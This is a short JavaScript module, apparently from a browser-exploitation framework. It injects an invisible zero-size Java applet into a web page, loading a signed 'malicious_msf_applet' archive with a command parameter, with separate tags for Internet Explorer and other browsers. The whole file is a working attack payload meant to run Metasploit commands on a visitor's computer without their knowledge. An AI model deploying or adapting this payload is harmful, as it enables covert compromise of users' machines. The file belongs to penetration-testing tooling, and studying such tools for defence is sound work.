
// ie doesn't play nice with dynamic loading of jars - below is a link to what sun recommends
// if any knows a nicer way to do this drop me an email
// http://java.sun.com/javase/6/docs/technotes/guides/plugin/developer_guide/using_tags.html#javascript

function applet() {	
	
	var _app = navigator.appName;

    var malicious = document.createElement("div");
	if (_app == 'Microsoft Internet Explorer') {
        	malicious.innerHTML = '<OBJECT classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" width="0" height="0">> <PARAM name="codebase" value="../modules/browser/malicious_msf_applet"> <PARAM name="code" value="Update.class"> <PARAM name="archive" value="SignedUpdate.jar"> <PARAM name="msfcmd" value="BAR"> </OBJECT>>';
	} else {
        malicious.innerHTML = '<OBJECT width="0" height="0" codebase="../modules/browser/malicious_msf_applet/" archive="SignedUpdate.jar" code="Update" type="application/x-java-applet;version=1.6"> <PARAM name="msfcmd" value="FOO"> </OBJECT>';        
	}

    document.body.appendChild(malicious);

	return_result(result_id, "Appet running");
}

applet();

